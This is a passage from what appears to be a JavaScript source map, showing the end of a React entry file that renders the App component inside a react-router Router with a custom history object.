from \"react-router-dom\";\nimport history from \"./components/History\";\n\nReactDOM.render(\n  <Router history={history}>\n    <App />\n  </Router>,\n  document.getElementById(\"root\")\n);\n"],"sourceRoot":""}